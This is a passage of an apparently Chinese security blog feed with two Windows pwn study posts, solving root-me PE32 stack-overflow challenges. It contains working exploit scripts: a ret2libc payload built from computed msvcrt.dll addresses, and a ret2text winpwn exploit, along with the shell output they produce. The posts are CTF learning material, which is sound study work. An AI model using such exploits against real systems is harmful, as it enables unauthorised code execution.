class="line">f.close()</span><br></pre></td></tr></tbody></table></figure><p>运行之后最后那一串就是printf的真实地址，因为是argv这种参数，所以接收地址不是很好接收，winpwn自动化没有输出（很奇怪），所以笔者就用动态调试exp来获得printf的真实地址，这里笔者用的ida调试的</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS ch73&gt; .\ch73.exe p2</span><br><span class="line">File name: p2</span><br><span class="line">File size: <span class="number">8228</span></span><br><span class="line">Alphanumerical chars: <span class="number">2054</span></span><br><span class="line">Words: <span class="number">1</span></span><br><span class="line">Lines: <span class="number">0</span></span><br><span class="line">File pointer: <span class="number">75E2</span>D660</span><br><span class="line">pV觰PW觰癢觰 Y觰PY觰€[觰File name: 兡[?垭壝岰?卲*@</span><br></pre></td></tr></tbody></table></figure><p>在<code>401825</code>这里下个断点然后，在debug里面选择本地，找到程序后Parameters里面放入p2也就是argv，然后开始调试</p><img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/6.png" alt="1" style="zoom:67%;"><p>到断点那里，然后g搜索到<code>406200</code>这个地址，这个里面就存放的是printf的真实地址</p><img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/7.png" alt="1" style="zoom: 50%;"><p>拿到printf真实的地址之后就需要算dll的base，在笔者的虚拟机里<code>msvcrt.dll</code>是在<code>C:\Windows\SyChpe32\msvcrt.dll</code>但是笔者在实机上测的时候这个程序的dll在 <code>C:\WINDOWS\SysWOW64\msvcrt.dll</code>这里</p><p>把dll文件拖到ida中，搜索printf在dll里面的偏移算出dll_base，还有system以及cmd.exe的偏移并算出真实地址</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf_addr = <span class="number">0x75D35670</span></span><br><span class="line"></span><br><span class="line">dll_base = printf_addr - <span class="number">0x10105670</span></span><br><span class="line">system_addr = dll_base + <span class="number">0x10105A70</span></span><br><span class="line"></span><br><span class="line">cmd_addr = dll_base + <span class="number">0x1010D158</span></span><br></pre></td></tr></tbody></table></figure><p>最后再构造getshell的payload如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p1 = p32(<span class="number">0x75E2D660</span>) * <span class="number">2053</span></span><br><span class="line">p1 += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p1 += p32(system_addr)</span><br><span class="line">p1 += p32(<span class="number">0x004016E3</span>)</span><br><span class="line">p1 += p32(cmd_addr)</span><br><span class="line"></span><br><span class="line">p1 = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> p1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'./p3'</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(p1))</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></tbody></table></figure><p>运行即可getshell</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS ch73&gt; .\ch73.exe p3</span><br><span class="line">File name: p3</span><br><span class="line">File size: <span class="number">8228</span></span><br><span class="line">Alphanumerical chars: <span class="number">2056</span></span><br><span class="line">Words: <span class="number">1</span></span><br><span class="line">Lines: <span class="number">0</span></span><br><span class="line">File pointer: <span class="number">75E2</span>D660</span><br><span class="line">Microsoft Windows [版本 <span class="number">10.0</span><span class="number">.22000</span><span class="number">.1219</span>]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br></pre></td></tr></tbody></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里笔者学习了IAT表和作用，还有argv参数的调试，坑点是<code>msvcrt.dll</code>这个文件位置需要根着自己本机的程序来确定，笔者卡在这里一段时间，最后想了一下把程序在ida中调试了一下才发现<code>msvcrt.dll</code>的位置和网上的wp有些不一样</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://zhuanlan.zhihu.com/p/406236763">https://zhuanlan.zhihu.com/p/406236763</a></p><p><a href="https://baike.baidu.com/item/ntdll.dll/10959419">https://baike.baidu.com/item/ntdll.dll/10959419</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/</a></p><p><a href="https://www.polarxiong.com/archives/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3DLL%E4%B8%8D%E6%98%AF%E5%9C%B0%E5%9D%80%E6%97%A0%E5%85%B3%E7%9A%84-DLL%E4%B8%8EELF%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90.html">https://www.polarxiong.com/archives/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3DLL%E4%B8%8D%E6%98%AF%E5%9C%B0%E5%9D%80%E6%97%A0%E5%85%B3%E7%9A%84-DLL%E4%B8%8EELF%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90.html</a></p><p><a href="https://www.anquanke.com/post/id/210394">https://www.anquanke.com/post/id/210394</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;blockquote&gt;
&lt;p&gt;首发于：&lt;a href=&quot;https://xz.aliyun.com/t/11891&quot;&gt;先知社区&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上一节笔者学习了winpwn的用法，以及最基础的栈溢出利用用法和win pwn</summary>
      
    
    
    
    <category term="study" scheme="https://www.z1r0.top/categories/study/"/>
    
    
    <category term="win pwn" scheme="https://www.z1r0.top/tags/win-pwn/"/>
    
  </entry>
  
  <entry>
    <title>win pwn初探（一）</title>
    <link href="https://www.z1r0.top/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://www.z1r0.top/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-11-23T02:36:06.000Z</published>
    <updated>2023-08-17T06:34:09.496Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><blockquote><p>首发于：<a href="https://xz.aliyun.com/t/11865">先知社区</a></p><p>一直都感觉win pwn很难所以就没接触过，但是看了一些CVE之后还有ZDI最近公布的一些CVE，发现win/软件上的漏洞占比要比linux上的占比多很多，所以打算从最基础的开始学习。笔者在这win pwn方面纯属小白，如有错误欢迎指正</p></blockquote><h1 id="win-pwn初探（一）"><a href="#win-pwn初探（一）" class="headerlink" title="win pwn初探（一）"></a>win pwn初探（一）</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先笔者给出自己的本机环境和虚拟机环境</p><p>本机环境：m1 pro</p><p>虚拟机环境：PD 17，Windows 11 专业版-21H2</p><p>虽然是arm windows但是可以运行x32和x64的程序</p><h3 id="安装checksec"><a href="#安装checksec" class="headerlink" title="安装checksec"></a>安装checksec</h3><p>这里笔者摸索了挺长时间的，winchecksec笔者因为各种各样的环境问题导致没有安装成功，但是笔者找到了一个在win上可以直接checksec的<a href="https://github.com/Wenzel/checksec.py">github项目</a>，只需要去它的<a href="https://github.com/Wenzel/checksec.py/releases">releases</a>下载<a href="https://github.com/Wenzel/checksec.py/releases/download/v0.6.2/checksec.exe">checksec.exe</a>即可。</p><h3 id="安装winpwn"><a href="#安装winpwn" class="headerlink" title="安装winpwn"></a>安装winpwn</h3><p>这个就和linux下的pwntools类似，<a href="https://github.com/byzero512/winpwn">使用地址</a>，安装的话直接执行以下命令即可</p><ul><li>pip3 install winpwn</li><li>pip3 install pefile</li><li>pip3 install keystone-engine</li><li>pip3 install install capstone</li></ul><p>安装完成之后就可以<code>from winpwn import *</code>了</p><h3 id="安装windbg"><a href="#安装windbg" class="headerlink" title="安装windbg"></a>安装windbg</h3><p>其实可以直接用ollydbg、x32dbg、x64dbg，但是笔者看见很多win上CVE复现都用的是windbg，所以笔者也去装了一个</p><p>直接去windows的store商店搜索windbg，直接点击安装即可</p><p>笔者学到目前为止只用到了上面的这三个工具，后续用到其他的话就继续添加吧</p><h2 id="winpwn保护机制"><a href="#winpwn保护机制" class="headerlink" title="winpwn保护机制"></a>winpwn保护机制</h2><p>win上的保护要比linux上的保护多上很多，这里笔者写了一个测试程序然后使用vs2022 preview默认编译成x64的exe</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>.\checksec.exe 目标程序</code>就可以看见目标程序的保护机制</p><p><img src="/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/1.png" alt="1"></p><p>NX：这个在win上其实是DEP，堆栈不可执行保护</p><p>Canary：这个在win上其实是GS，可能这个工具的开发者为了让我们更好理解才写了Canary，但是需要注意的是这个工具的canary检测可能检测不准</p><p>ASLR：通俗讲就是地址随机化，让exe和dll的地址全部随机，所以就有了大名鼎鼎<strong>Heap Spray</strong>（堆喷）利用技术，Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。</p><p>Dynamic Base：程序编译时可通过/DYNAMICBASE编译选项指示程序是否利用ASLR的功能</p><p>High Entropy VA：如果指定此选项，则当内核将进程的地址空间布局随机化为 ASLR 的一部分时，兼容版本的 Windows 内核可以使用更高的熵。 如果内核使用更高的熵，则可以将更多的地址分配给堆栈和堆等内存区域。 因此，更难猜测特定内存区域的位置。当该选项打开时，当这些模块作为 64 位进程运行时，目标可执行文件和它所依赖的任何模块必须能够处理大于 4 GB 的指针值。</p><p>SEH：结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术。SEH 是 Windows操作系统的一种系统机制，本身与具体的程序设计语言无关。SEH 为Windows的设计者提供了程序错误或异常的处理途径，使得系统更加健壮</p><p>SafeSEH：为了防止攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击，在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠，立即终止异常处理函数的调用。不过SafeSEH需要编译器和系统双重支持，缺少一个则保护能力基本就丧失了</p><p>Force Integrity：强制签名保护</p><p>Control Flow Guard：控制Flow防护 (CFG) 是一项高度优化的平台安全功能，旨在打击内存损坏漏洞。 通过严格限制应用程序可以从何处执行代码，利用漏洞（如缓冲区溢出）执行任意代码会更加困难</p><p>Isolation：隔离保护，默认会开启</p><p>Authenticode：签名保护</p><p>以上是checksec的每个保护机制的简要解释，看到这里可能还会迷迷糊糊的，后续的win pwn文章利用会有绕过这些保护，到时候会详细的解释，包括什么是TIB，TEB等</p><h2 id="初探栈溢出"><a href="#初探栈溢出" class="headerlink" title="初探栈溢出"></a>初探栈溢出</h2><p>这里用比较经典的<code>root-me PE32 - Stack buffer overflow basic</code>win pwn题来上手熟悉一下</p><p><a href="https://www.root-me.org/zh/%E6%8C%91%E6%88%98/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E7%B3%BB%E7%BB%9F/PE32-Stack-buffer-overflow-basic">题目地址</a>，题目也给出了源码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_LEN 16</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">admin_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">        system(<span class="string">"C:\\Windows\\system32\\cmd.exe"</span>);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">        <span class="type">char</span> buff[DEFAULT_LEN] = {<span class="number">0</span>};</span><br><span class="line"> </span><br><span class="line">        gets(buff);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; DEFAULT_LEN; i++) {</span><br><span class="line">                buff[i] = <span class="built_in">toupper</span>(buff[i]);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buff);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>将程序利用scp下载到本地，然后checksec看一下保护机制</p><p><img src="/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/2.png" alt="1"></p><p>上面显示开了Canary，但是在ida分析的时候是没有开canary的</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">15</span>]; <span class="comment">// [esp+0h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+Fh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>笔者修了一下之后ida分析结果最后如上</p><p>这个程序意思就是输入buf，然后把buf的小写字母转换成大写字母最后输出出来，但是gets的话会导致栈溢出漏洞</p><p>现在我们以linux平台下的攻击思路来的话就是一个ret2text，后门地址是0x401000</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00401000</span>                               ;org <span class="number">401000</span>h</span><br><span class="line">.text:<span class="number">00401000</span>                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br><span class="line">.text:<span class="number">00401000</span> <span class="number">55</span>                            push    ebp</span><br><span class="line">.text:<span class="number">00401001</span> <span class="number">8B</span> EC                         mov     ebp, esp</span><br><span class="line">.text:<span class="number">00401003</span> <span class="number">68</span> <span class="number">00</span> B0 <span class="number">41</span> <span class="number">00</span>                push    offset aCWindowsSystem          ; <span class="string">"C:\\Windows\\system32\\cmd.exe"</span></span><br><span class="line">.text:<span class="number">00401008</span> E8 BF <span class="number">2B</span> <span class="number">00</span> <span class="number">00</span>                call    sub_403BCC</span><br><span class="line">.text:<span class="number">00401008</span></span><br><span class="line">.text:<span class="number">0040100</span>D <span class="number">83</span> C4 <span class="number">04</span>                      add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00401010</span> <span class="number">5</span>D                            pop     ebp</span><br><span class="line">.text:<span class="number">00401011</span> C3                            retn</span><br></pre></td></tr></tbody></table></figure><p>ida分析之后发现偏移为0x14，所以<code>payload = b'a' * (0x14 + 4) + p32(0x401000)</code></p><img src="/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/3.png" alt="1" style="zoom:50%;"><p>发送过去之后成功的劫持了程序流到后门地址上，成功获取一个shell</p><p>最终exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ch72.exe'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'a'</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇初探文章只是简单的了解了windows下的保护机制，和winpwn的一个用法，后续会学习如何调试，如何绕过这些保护，包括如何用pwntools来写exp</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://blog.chinaunix.net/uid-24917554-id-3492618.html">http://blog.chinaunix.net/uid-24917554-id-3492618.html</a></p><p><a href="https://www.jianshu.com/p/4f89f810d98e">https://www.jianshu.com/p/4f89f810d98e</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;blockquote&gt;
&lt;p&gt;首发于：&lt;a href=&quot;https://xz.aliyun.com/t/11865&quot;&gt;先知社区&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一直都感觉win pwn很难所以就没接触过，但是看了一些CVE之后还有ZDI最</summary>
      
    
    
    
    <category term="study" scheme="https://www.z1r0.top/categories/study/"/>
    
    
    <category term="win pwn" scheme="https://www.z1r0.top/tags/win-pwn/"/>
    
  </entry>
  
</feed>
